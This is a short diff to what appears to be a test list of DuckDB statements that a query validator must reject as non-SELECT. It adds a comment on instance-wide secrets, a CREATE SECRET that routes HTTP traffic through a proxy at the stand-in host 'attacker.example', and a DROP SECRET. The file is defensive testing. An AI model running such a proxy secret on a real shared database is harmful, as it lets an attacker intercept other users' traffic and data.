@@ -29,7 +29,10 @@ NOT_A_SELECT = [
     "SET disabled_filesystems=''",
     "PRAGMA database_list",
     "CALL pragma_table_info('resource')",
+    # secrets belong to the instance: one created by a query would be seen by all the others
     "CREATE SECRET leak (TYPE s3, KEY_ID 'a', SECRET 'b')",
+    "CREATE SECRET proxy (TYPE http, HTTP_PROXY 'attacker.example:8080')",
+    "DROP SECRET IF EXISTS proxy",
 ]
 
 MULTI_STATEMENTS = [
